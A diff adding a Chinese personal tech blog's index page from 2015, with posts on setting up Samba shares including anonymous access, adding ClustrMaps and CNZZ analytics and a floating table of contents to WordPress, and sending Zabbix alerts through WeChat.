+    #允许哪些网段访问共享服务
+    hosts allow = 127\. 10.19.21\. 10.19.10.
+    # logs split per machine
+    log file = /var/log/samba/log.%m
+    # max 50KB per log file, then rotate
+    max log size = 50
+    security = user
+    passdb backend = tdbsam
+    load printers = yes
+    cups options = raw
+
+    [homes]
+    comment = Home Directories
+    browseable = no
+    writable = yes
+
+    [printers]
+    comment = All Printers
+    path = /var/spool/samba
+    browseable = no
+    guest ok = no
+    writable = no
+    printable = yes
+
+    [share] #共享名
+    comment = Public Stuff #共享说明
+    path = /home/share #共享路径
+    public = no #不允许匿名登录
+    writable = yes #可写
+    printable = no #关闭打印服务
+    write list = @user1 #可写用户组，多个可用空格分隔
+    valid users = @user1 #有效的用户组，多个可用空格分隔
+    browseable = yes #用户可浏览</pre>
+
+<h3 id="3-测试配置文件语法"><a href="#3-测试配置文件语法" class="headerlink" title="3. 测试配置文件语法"></a>3. 测试配置文件语法</h3><pre class="lang:sh decode:true">[root@VM-241 ~]# testparm
+Load smb config files from /etc/samba/smb.conf
+Processing section "[homes]"
+Processing section "[printers]"
+Processing section "[share]"
+Loaded services file OK.
+Server role: ROLE_STANDALONE
+Press enter to see a dump of your service definitions
+
+[global]
+    workgroup = MYGROUP
+    server string = Samba Server Version %v
+    log file = /var/log/samba/log.%m
+    max log size = 50
+    idmap config * : backend = tdb
+    hosts allow = 127., 10.19.21., 10.19.10.
+    cups options = raw
+
+[homes]
+    comment = Home Directories
+    read only = No
+    browseable = No
+
+[printers]
+    comment = All Printers
+    path = /var/spool/samba
+    printable = Yes
+    print ok = Yes
+    browseable = No
+
+[share]
+    comment = Public Stuff
+    path = /home/share
+    write list = @user1
+    read only = No</pre>
+
+<h3 id="4-创建系统用户和smb密码"><a href="#4-创建系统用户和smb密码" class="headerlink" title="4. 创建系统用户和smb密码"></a>4. 创建系统用户和smb密码</h3><pre class="lang:sh decode:true">[root@VM-241 ~]# useradd  user1
+[root@VM-241 ~]# smbpasswd -a user1
+New SMB password:
+Retype new SMB password:</pre>
+
+<h3 id="5-创建共享目录"><a href="#5-创建共享目录" class="headerlink" title="5. 创建共享目录"></a>5. 创建共享目录</h3><pre class="lang:sh decode:true">[root@VM-241 ~]# mkdir /home/share
+[root@VM-241 ~]# chmod 777 /home/share</pre>
+
+<h3 id="6-现在本机测试"><a href="#6-现在本机测试" class="headerlink" title="6. 现在本机测试"></a>6. 现在本机测试</h3><pre class="lang:sh decode:true">[root@VM-241 ~]# smbclient //localhost/share -U user1
+Enter user1's password:
+Domain=[MYGROUP] OS=[Unix] Server=[Samba 3.6.23-20.el6]
+smb: \&gt; put hello.py
+putting file hello.py as \hello.py (22.4 kb/s) (average 22.4 kb/s)
+smb: \&gt; ls
+  .                                   D        0  Fri Oct 23 14:02:34 2015
+  ..                                  D        0  Fri Oct 23 13:59:57 2015
+  hello.py                            A      321  Fri Oct 23 14:02:34 2015
+
+        35036 blocks of size 524288\. 20525 blocks available
+smb: \&gt; exit</pre>
+
+<h3 id="7-客户端连接"><a href="#7-客户端连接" class="headerlink" title="7. 客户端连接"></a>7. 客户端连接</h3><h5 id="7-1-测试客户端是mac，所以打开Finder-菜单里找到”前往”—-gt-”连接服务器”、或者运行command-k命令"><a href="#7-1-测试客户端是mac，所以打开Finder-菜单里找到”前往”—-gt-”连接服务器”、或者运行command-k命令" class="headerlink" title="7.1 测试客户端是mac，所以打开Finder, 菜单里找到”前往”—&gt;”连接服务器”、或者运行command+k命令"></a>7.1 测试客户端是mac，所以打开Finder, 菜单里找到”前往”—&gt;”连接服务器”、或者运行command+k命令</h5><p><img src="http://www.cenhq.com/wp-content/uploads/2015/10/QQ20151023-0@2x.png" alt=""></p>
+<h5 id="7-2-输入用户名和密码"><a href="#7-2-输入用户名和密码" class="headerlink" title="7.2 输入用户名和密码"></a>7.2 输入用户名和密码</h5><p><img src="http://www.cenhq.com/wp-content/uploads/2015/10/QQ20151023-1@2x.png" alt=""></p>
+<h5 id="7-3-查看刚上传的共享文件"><a href="#7-3-查看刚上传的共享文件" class="headerlink" title="7.3 查看刚上传的共享文件"></a>7.3 查看刚上传的共享文件</h5><p><img src="http://www.cenhq.com/wp-content/uploads/2015/10/QQ20151023-2@2x.png" alt=""></p>
+<h5 id="7-4-从客户端添加文件"><a href="#7-4-从客户端添加文件" class="headerlink" title="7.4 从客户端添加文件"></a>7.4 从客户端添加文件</h5><p><img src="http://www.cenhq.com/wp-content/uploads/2015/10/QQ20151023-3@2x.png" alt=""></p>
+<h5 id="7-5-到服务器上查看"><a href="#7-5-到服务器上查看" class="headerlink" title="7.5 到服务器上查看"></a>7.5 到服务器上查看</h5><p><img src="http://www.cenhq.com/wp-content/uploads/2015/10/QQ20151023-4@2x.png" alt=""></p>
+<h3 id="8-添加匿名用户访问"><a href="#8-添加匿名用户访问" class="headerlink" title="8.添加匿名用户访问"></a>8.添加匿名用户访问</h3><pre class="lang:sh decode:true">[root@VM-241 ~]# vim /etc/samba/smb.conf
+        [global]
+        ...
+        security = user
+        passdb backend = tdbsam
+        map to guest = bad user #允许匿名访问
+        ...
+
+        [public]
+        comment = Public Stuff
+        path = /home/public
+        public = yes
+        writable = yes
+        printable = no
+        guest ok = yes #允许匿名访问</pre>
+
+<h3 id="9-创建共享目录和添加权限"><a href="#9-创建共享目录和添加权限" class="headerlink" title="9.创建共享目录和添加权限"></a>9.创建共享目录和添加权限</h3><pre class="lang:sh decode:true">[root@VM-241 ~]# mkdir /home/public
+[root@VM-241 ~]# chmod 777 /home/public</pre>
+
+<h3 id="10-重启服务"><a href="#10-重启服务" class="headerlink" title="10.重启服务"></a>10.重启服务</h3><pre class="lang:sh decode:true">[root@VM-241 ~]# /etc/init.d/smb restart</pre>
+
+<h3 id="11-服务器本地测试"><a href="#11-服务器本地测试" class="headerlink" title="11.服务器本地测试"></a>11.服务器本地测试</h3><pre class="lang:sh decode:true ">[root@VM-241 ~]# smbclient //localhost/public
+Enter guest's password:
+Anonymous login successful
+Domain=[MYGROUP] OS=[Unix] Server=[Samba 3.6.23-20.el6]
+smb: \&gt; ls
+  .                                   D        0  Fri Oct 23 15:16:05 2015
+  ..                                  D        0  Fri Oct 23 15:16:05 2015
+
+        35036 blocks of size 524288\. 20524 blocks available
+            list.txt            .ssh/
+smb: \&gt; put md5.txt
+putting file md5.txt as \md5.txt (8.8 kb/s) (average 8.8 kb/s)
+smb: \&gt; ls
+  .                                   D        0  Fri Oct 23 15:17:00 2015
+  ..                                  D        0  Fri Oct 23 15:16:05 2015
+  md5.txt                             A      153  Fri Oct 23 15:17:00 2015
+
+        35036 blocks of size 524288\. 20524 blocks available</pre>
+
+<h3 id="12-客户端测试"><a href="#12-客户端测试" class="headerlink" title="12.客户端测试"></a>12.客户端测试</h3><h5 id="12-1-测试客户端是mac，所以打开Finder-菜单里找到”前往”—-gt-”连接服务器”、或者运行command-k命令"><a href="#12-1-测试客户端是mac，所以打开Finder-菜单里找到”前往”—-gt-”连接服务器”、或者运行command-k命令" class="headerlink" title="12.1 测试客户端是mac，所以打开Finder, 菜单里找到”前往”—&gt;”连接服务器”、或者运行command+k命令"></a>12.1 测试客户端是mac，所以打开Finder, 菜单里找到”前往”—&gt;”连接服务器”、或者运行command+k命令</h5><p><img src="http://www.cenhq.com/wp-content/uploads/2015/10/QQ20151023-5@2x.png" alt=""></p>
+<h5 id="12-2-匿名访问，选择”客人”"><a href="#12-2-匿名访问，选择”客人”" class="headerlink" title="12.2 匿名访问，选择”客人”"></a>12.2 匿名访问，选择”客人”</h5><p><img src="http://www.cenhq.com/wp-content/uploads/2015/10/QQ20151026-0@2x.png" alt=""></p>
+<h5 id="12-3-查看结果"><a href="#12-3-查看结果" class="headerlink" title="12.3 查看结果"></a>12.3 查看结果</h5><p><img src="http://www.cenhq.com/wp-content/uploads/2015/10/QQ20151023-9@2x.png" alt=""></p>
+<hr>
+<p>&nbsp;</p>
+<h3 id="13-samba参数详解"><a href="#13-samba参数详解" class="headerlink" title="13. samba参数详解"></a>13. samba参数详解</h3><p><pre class="lang:sh decode:true ">        [share] # 该共享的共享名<br>        comment = smb share test # 该共享的备注<br>        path = /home/share # 共享路径<br>        allow hosts = host(subnet) # 设置该Samba服务器允许的工作组或者域<br>        deny hosts = host(subnet) # 设置该Samba服务器拒绝的工作组或者域<br>        available = yes|no # 设置该共享目录是否可用<br>        browseable = yes|no # 设置该共享目录是否可显示<br>        writable = yes|no # 指定了这个目录缺省是否可写，也可以用readonly = no来设置可写<br>        public = yes|no # 指明该共享资源是否能给游客帐号访问，guest ok = yes其实和public = yes是一样的<br>        user = user, @group # user设置所有可能使用该共享资源的用户，也可以用@group代表group这个组的所有成员，不同的项目之间用空格或者逗号隔开<br>        valid users = user, @group # 指定能够使用该共享资源的用户和组<br>        invalid users = user, @group # 指定不能够使用该共享资源的用户和组<br>        read list = user, @group # 指定只能读取该共享资源的用户和组<br>        write list = user, @group # 指定能读取和写该共享资源的用户和组<br>        admin list = user, @group # 指定能管理该共享资源（包括读写和权限赋予等）的用户和组<br>        hide dot files = yes|no # 指明是否像UNIX那样隐藏以“.”号开头的文件<br>        create mode = 0755 # 指明新建立的文件的属性，一般是0755<br>        directory mode = 0755 # 指明新建立的目录的属性，一般是0755<br>        sync always = yes|no # 指明对该共享资源进行写操作后是否进行同步操作<br>        short preserve case = yes|no # 指明是否区分文件名大小写<br>        preserve case = yes|no # 指明是否保持大小写<br>        case sensitive = yes|no # 指明是否对大小写敏感，一般选no，不然可能引起错误<br>        mangle case = yes|no # 指明混合大小写<br>        default case = upper|lower # 指明缺省的文件名是全部大写还是小写<br>        force user = testuser # 强制把建立文件的属主是谁。如果我有一个目录，让guest可以写，那么guest就可以删除，如果我用force user= testuser强制建立文件的属主是testuser，同时限制create mask = 0755，这样guest就不能删除了<br>        wide links = yes|no # 指明是否允许共享外符号连接，比如共享资源里面有个连接指向非共享资源里面的文件或者目录，如果设置wide links = no将使该连接不可用<br>        max connections = 100 # 设定最大同时连接数<br>        delete readonly = yes|no # 指明能否删除共享资源里面已经被定义为只读的文件</pre><br>&nbsp;</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">samba</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">smbclient</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+	<div class="article-category tagcloud">
+		<i class="icon-book icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="/categories/Linux/" class="article-tag-list-link color1">Linux</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="/categories/Samba/" class="article-tag-list-link color1">Samba</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2015/10/23/samba-service-build/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+
+
+
+
+
+
+
+  
+    <article id="post-hero" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2015/10/23/hero/">Hero</a>
+    </h1>
+  
+
+        
+        <a href="/2015/10/23/hero/" class="archive-article-date">
+  	<time datetime="2015-10-23T13:47:42.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2015-10-23</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>在网易云音乐里偶然听见这首歌，第一遍感觉还不错，多听几遍也许你会喜欢，旋律很美。</p>
+<p>共享出来，给大家欣赏下</p>
+<p>[embed]<a href="http://www.cenhq.com/wp-content/uploads/2015/10/Family-of-the-Year-Hero.mp3[/embed" target="_blank" rel="external">http://www.cenhq.com/wp-content/uploads/2015/10/Family-of-the-Year-Hero.mp3[/embed</a>]</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+	<div class="article-category tagcloud">
+		<i class="icon-book icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="/categories/生活随笔/" class="article-tag-list-link color5">生活随笔</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2015/10/23/hero/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+
+
+
+
+
+
+
+  
+    <article id="post-wordpress-add-clustrmaps" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2015/10/16/wordpress-add-clustrmaps/">wordpress添加ClustrMaps</a>
+    </h1>
+  
+
+        
+        <a href="/2015/10/16/wordpress-add-clustrmaps/" class="archive-article-date">
+  	<time datetime="2015-10-16T14:44:01.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2015-10-16</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>首先到<a href="http://www.clustrmaps.com/zh/index.htm" target="_blank" rel="external">http://www.clustrmaps.com/zh/index.htm</a>生成自己的地图</p>
+<div>然后注册登录账号，获取地图代码</div><br><div></div><br><div>根据主题布局放置代码位置，这里我放在右侧。</div><br><div>编辑文件sidebar-right.php,添加以下内容：</div><br><div><br><pre class="lang:php decode:true ">&lt;!–ClusterMap–&gt;<br>&lt;aside class=”widget”&gt;&lt;h3 class=”widget-title”&gt;统计&lt;/h3&gt;&lt;div id=”clustrmaps-widget”&gt;&lt;/div&gt;&lt;script type=”text/javascript”&gt;var _clustrmaps = {‘url’ : ‘<a href="http://www.cenhq.com" target="_blank" rel="external">http://www.cenhq.com</a>‘, ‘user’ : 1181037, ‘server’ : ‘3’, ‘id’ : ‘clustrmaps-widget’, ‘version’ : 1, ‘date’ : ‘2015-10-16’, ‘lang’ : ‘zh’, ‘corners’ : ‘square’ };(function (){ var s = document.createElement(‘script’); s.type = ‘text/javascript’; s.async = true; s.src = ‘<a href="http://www3.clustrmaps.com/counter/map.js" target="_blank" rel="external">http://www3.clustrmaps.com/counter/map.js</a>‘; var x = document.getElementsByTagName(‘script’)[0]; x.parentNode.insertBefore(s, x);})();&lt;/script&gt;&lt;noscript&gt;&lt;a href=”<a href="http://www3.clustrmaps.com/user/f5e12056d&quot;&gt;&lt;img" target="_blank" rel="external">http://www3.clustrmaps.com/user/f5e12056d&quot;&gt;&lt;img</a> src=”<a href="http://www3.clustrmaps.com/stats/maps-no_clusters/www.cenhq.com-thumb.jpg" target="_blank" rel="external">http://www3.clustrmaps.com/stats/maps-no_clusters/www.cenhq.com-thumb.jpg</a>“ alt=”Locations of visitors to this page” /&gt;&lt;/a&gt;&lt;/noscript&gt;&lt;/div&gt;&lt;/aside&gt;</pre><br><div>效果显示：</div><br><div><img src="http://www.cenhq.com/wp-content/uploads/2015/10/QQ20151016-3@2x.png" alt=""></div><br></div>
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">ClustrMaps</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">wordpress</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+	<div class="article-category tagcloud">
+		<i class="icon-book icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="/categories/Wordpress/" class="article-tag-list-link color5">Wordpress</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2015/10/16/wordpress-add-clustrmaps/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+
+
+
+
+
+
+
+  
+    <article id="post-wordpress-add-cnzz" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2015/10/16/wordpress-add-cnzz/">wordpress添加CNZZ统计</a>
+    </h1>
+  
+
+        
+        <a href="/2015/10/16/wordpress-add-cnzz/" class="archive-article-date">
+  	<time datetime="2015-10-16T14:40:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2015-10-16</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <div>首先注册cnzz用户，并绑定网站域名</div><br><div></div><br><div>获取统计代码，复制代码到主题里的footer.php文件里</div><br><div></div><br><div>然后位置显示有问题</div><br><div><img src="http://www.cenhq.com/wp-content/uploads/2015/10/QQ20151016-0@2x.png" alt=""></div><br><div></div><br><div><br><div>我想把图标移动到wordpress后面</div><br><div></div><br><div>首先注释footer.php里的CNZZ统计代码</div><br><div></div><br><div>然后编辑文件library/structure/footer-extensions.php</div><br><div></div><br><div>编辑后的内容如下：</div><br><div><br><pre class="lang:php decode:true ">function travelify_footer_info() {<br>     echo ‘&lt;div class=”copyright”&gt;’;<br>     echo <strong>( ‘Copyright &amp;copy;’, ‘travelify’ );<br>     echo ‘ ‘.date(‘Y’);<br>     echo ‘ ‘.travelify_site_link();<br>     echo ‘. ‘.</strong>( ‘Theme by’, ‘travelify’ );<br>     echo ‘ ‘.travelify_colorlib_link(    );<br>     echo ‘ ‘.__( ‘Powered by’, ‘travelify’ );<br>     echo ‘ ‘.travelify_wp_link();<br>     echo ‘&lt;div class=”cnzz_tj” style=”<br>    display: inline-block;<br>    vertical-align: middle;<br>    margin-left: 5px;<br>    line-height: 13px;<br>“&gt;统计使用：’;<br>     echo ‘&lt;script type=”text/javascript”&gt;var cnzz_protocol = ((“https:” == document.location.protocol) ? “ https://“ : “ <a href="http://&quot;);document.write(unescape(&quot;%3Cspan" target="_blank" rel="external">http://&quot;);document.write(unescape(&quot;%3Cspan</a> id=\’cnzz_stat_icon_1256550401\’%3E%3C/span%3E%3Cscript src=\’” + cnzz_protocol + “s4.cnzz.com/z_stat.php%3Fid%3D1256550401%26show%3Dpic\’ type=\’text/javascript\’%3E%3C/script%3E”));&lt;/script&gt;’;<br>     echo ‘&lt;/div&gt;’;<br>     echo ‘&lt;/div&gt;&lt;!– .copyright –&gt;’;<br>  }</pre><br>保存后刷新页面<br><br><img src="http://www.cenhq.com/wp-content/uploads/2015/10/QQ20151016-2@2x.png" alt=""><br><br></div><br></div>
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">wordpress</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">cnzz</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+	<div class="article-category tagcloud">
+		<i class="icon-book icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="/categories/Wordpress/" class="article-tag-list-link color5">Wordpress</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2015/10/16/wordpress-add-cnzz/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+
+
+
+
+
+
+
+  
+    <article id="post-wordpress-add-suspended-the-index" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2015/10/15/wordpress-add-suspended-the-index/">wordpress添加悬浮文章索引</a>
+    </h1>
+  
+
+        
+        <a href="/2015/10/15/wordpress-add-suspended-the-index/" class="archive-article-date">
+  	<time datetime="2015-10-15T16:50:35.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2015-10-15</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>文章索引相当于文章目录，点击目录自动跳转到相应位置，这就需要你的文章有小标题，像我经常用h3标签来做小标题，这样所有的h3标签就能形成一个索引目录。我们要做的就是把h3标签自动识别出来并组装成一个目录，好了，开始实现方法。</p>
+<h4 id="实现方法"><a href="#实现方法" class="headerlink" title="实现方法"></a>实现方法</h4><p>在文章里必须有h3标签，每一个三级标题都会成为索引中的一项。将下面的代码放到function.php中，就会在你的文章中自动生成一个索引。</p>
+<p>修改functions.php文件，添加如下内容：</p>
+<pre class="lang:php decode:true">function article_nav($content)
+{
+    $matches = array();
+    $ul_li = '';
+    $r = "/&lt;h3&gt;(.*?)&lt;\/h3&gt;/im";
+    if (preg_match_all($r, $content, $matches)) {
+        foreach ($matches[1] as $num =&gt; $title) {
+            $content = str_replace($matches[0][$num], '&lt;h2 id="article_nav_' . $num . '"&gt;' . $title . '&lt;/h2&gt;', $content);
+            $ul_li .= '&lt;li&gt;&lt;a href="#article_nav_' . $num . '" title="' . $title . '"&gt;' . $title . "&lt;/a&gt;&lt;/li&gt;";
+        }
+        if (is_singular()) {
+            $content = '&lt;div id="fn_article_nav"&gt;&lt;div id="article_nav_title"&gt;[文章目录]&lt;/div&gt;&lt;ul&gt;'
+                . $ul_li . '&lt;li&gt;&lt;a href="#respond"&gt;发表评论&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt;' . $content;
+        }
+    }
+    return $content;
+}
+add_filter("the_content", "article_nav");</pre>
+
+<h4 id="索引样式"><a href="#索引样式" class="headerlink" title="索引样式"></a>索引样式</h4><p>索引是生成了，但是只是在文章中的一个普通ul list，我们要做的是把他独立出来，所以只需要为它写一个css样式就好了。推荐用position:fixed把他固定到左边或者右边，下方提供了一个参考样式（见上图），可以根据自己的情况去修改。</p>
+<p>修改style.css文件，添加以下内容：</p>
+<pre class="lang:css decode:true">/* 文章目录 */
+#article_nav_title{font-size:12px;text-align:center;line-height:15px;color:#cc0000;border-left:3px #cc0000 solid;border-bottom:1px #aaa dotted}
+#fn_article_nav{position:fixed;left:5px;top:140px;background-color:rgba(255,255,255,.55);border-radius: 0 3px 3px 0;box-shadow:0 0 2px #aaa}
+#fn_article_nav ul{padding:0!important;margin:0px!important}
+#fn_article_nav li{list-style:none;padding:3px;width:100px;margin:0;background: url("images/li.png") no-repeat scroll 0 5px transparent!important;text-indent: 1.6em;font-size:12px}</pre>
+
+<h4 id="查看效果"><a href="#查看效果" class="headerlink" title="查看效果"></a>查看效果</h4><p><img src="http://www.cenhq.com/wp-content/uploads/2015/10/QQ20151015-14@2x.png" alt=""></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">wordpress</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+	<div class="article-category tagcloud">
+		<i class="icon-book icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="/categories/Wordpress/" class="article-tag-list-link color5">Wordpress</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2015/10/15/wordpress-add-suspended-the-index/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+
+
+
+
+
+
+
+  
+    <article id="post-zabbix-add-webchat-alarm" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2015/10/15/zabbix-add-webchat-alarm/">zabbix使用微信报警</a>
+    </h1>
+  
+
+        
+        <a href="/2015/10/15/zabbix-add-webchat-alarm/" class="archive-article-date">
+  	<time datetime="2015-10-15T14:16:14.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2015-10-15</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="1-注册微信公众号"><a href="#1-注册微信公众号" class="headerlink" title="1.注册微信公众号"></a>1.注册微信公众号</h3><div></div><br><div>首先到微信公众平台<a href="https://mp.weixin.qq.com" target="_blank" rel="external">https://mp.weixin.qq.com</a>申请</div><br><div></div><br><div>然后登录，手机客户端扫描二维码，并加关注就可以了</div><br><div></div><br><div>然后就可以看到用户数</div><br><div><img src="http://www.cenhq.com/wp-content/uploads/2015/10/QQ20151015-7@2x.png" alt=""></div><br><div>点击用户数，并点击用户，可以看到用户的tofakeid，这个ID就是zabbix将发送报警信息到这个账号。</div><br><div><img src="http://www.cenhq.com/wp-content/uploads/2015/10/QQ20151015-10@2x.png" alt=""></div><br><div><br><div>可以在URL里看到这个ID</div><br><div><a href="https://mp.weixin.qq.com/cgi-bin/singlesendpage?tofakeid=353131080&amp;t=message/send&amp;action=index&amp;token=1007714535&amp;lang=zh_CN" target="_blank" rel="external">https://mp.weixin.qq.com/cgi-bin/singlesendpage?tofakeid=<span style="color: #ff0000;">353131080</span>&amp;t=message/send&amp;action=index&amp;token=1007714535&amp;lang=zh_CN</a></div><br><div></div><br></div><br><div><br><br>### 2.下载微信公众平台私有接口<br><br><div></div>
+
+<h4 id="2-1-进入zabbix报警目录，下载文件"><a href="#2-1-进入zabbix报警目录，下载文件" class="headerlink" title="2.1 进入zabbix报警目录，下载文件"></a>2.1 进入zabbix报警目录，下载文件</h4><pre class="lang:sh decode:true ">[root@monitor ~]# cd /usr/local/share/zabbix/alertscripts
+[root@monitor alertscripts]# git clone https://github.com/lealife/WeiXin-Private-API
+Initialized empty Git repository in /usr/local/share/zabbix/alertscripts/WeiXin-Private-API/.git/
+remote: Counting objects: 172, done.
+remote: Total 172 (delta 0), reused 0 (delta 0), pack-reused 172
+Receiving objects: 100% (172/172), 36.94 KiB, done.
+Resolving deltas: 100% (72/72), done.</pre>
+
+<h4 id="2-2-修改配置文件"><a href="#2-2-修改配置文件" class="headerlink" title="2.2 修改配置文件"></a>2.2 修改配置文件</h4><pre class="lang:sh decode:true">[root@monitor alertscripts]# vim WeiXin-Private-API/config.php
+
+&lt;?php
+
+// 全局配置
+
+$G_ROOT = dirname(__FILE__);
+
+$G_CONFIG["weiXin"] = array(
+        'account' =&gt; '微信公众登录账号',
+        'password' =&gt; '微信公众登录密码',
+        'cookiePath' =&gt; $G_ROOT. '/cache/cookie', // cookie缓存文件路径
+        'webTokenPath' =&gt; $G_ROOT. '/cache/webToken', // webToken缓存文件路径
+);
+
+[root@monitor alertscripts]# vim WeiXin-Private-API/test.php
+
+&lt;?php
+require "config.php";
+require "include/WeiXin.php";
+
+$weiXin = new WeiXin($G_CONFIG['weiXin']);
+
+$testFakeId = "$argv[1]";
+$msg = "$argv[3]";
+ print_r($weiXin-&gt;send($testFakeId, "$msg"));</pre>
+<span style="color: #ff00ff;">注意</span>：这里$msg="$argv[3]"表示zabbix传入的第三个参数，因为在zabbix报警时会传入三个参数：一是微信好友ID，二是报警信息的主题，三是报警信息的具体内容，这里跳过了报警信息主题，直接发送报警信息内容
+
+#### 2.3 创建报警脚本
+
+<pre class="lang:sh decode:true ">[root@monitor alertscripts]# vim weixin
+/usr/local/php/bin/php /usr/local/share/zabbix/alertscripts/WeiXin-Private-API/test.php "$1" "$2" "$3"</pre>
+
+<h4 id="2-4-修改权限"><a href="#2-4-修改权限" class="headerlink" title="2.4 修改权限"></a>2.4 修改权限</h4><pre class="lang:sh decode:true ">[root@monitor alertscripts]# chown www. weixin WeiXin-Private-API -R
+[root@monitor alertscripts]# chmod +x weixin</pre>
+
+<h4 id="2-5-测试脚本"><a href="#2-5-测试脚本" class="headerlink" title="2.5 测试脚本"></a>2.5 测试脚本</h4><pre class="lang:sh decode:true ">[root@monitor alertscripts]# ./weixin 353131080 "" "hello weixin"
+PHP Notice:  curl_setopt(): CURLOPT_SSL_VERIFYHOST with value 1 is deprecated and will be removed as of libcurl 7.28.1\. It is recommended to use value 2 instead in /usr/local/share/zabbix/alertscripts/WeiXin-Private-API/include/LeaWeiXinClient.php on line 32
+
+Notice: curl_setopt(): CURLOPT_SSL_VERIFYHOST with value 1 is deprecated and will be removed as of libcurl 7.28.1\. It is recommended to use value 2 instead in /usr/local/share/zabbix/alertscripts/WeiXin-Private-API/include/LeaWeiXinClient.php on line 32
+PHP Notice:  Undefined index: HTTP_USER_AGENT in /usr/local/share/zabbix/alertscripts/WeiXin-Private-API/include/LeaWeiXinClient.php on line 33
+
+Notice: Undefined index: HTTP_USER_AGENT in /usr/local/share/zabbix/alertscripts/WeiXin-Private-API/include/LeaWeiXinClient.php on line 33
+PHP Notice:  curl_setopt(): CURLOPT_SSL_VERIFYHOST with value 1 is deprecated and will be removed as of libcurl 7.28.1\. It is recommended to use value 2 instead in /usr/local/share/zabbix/alertscripts/WeiXin-Private-API/include/LeaWeiXinClient.php on line 32
+
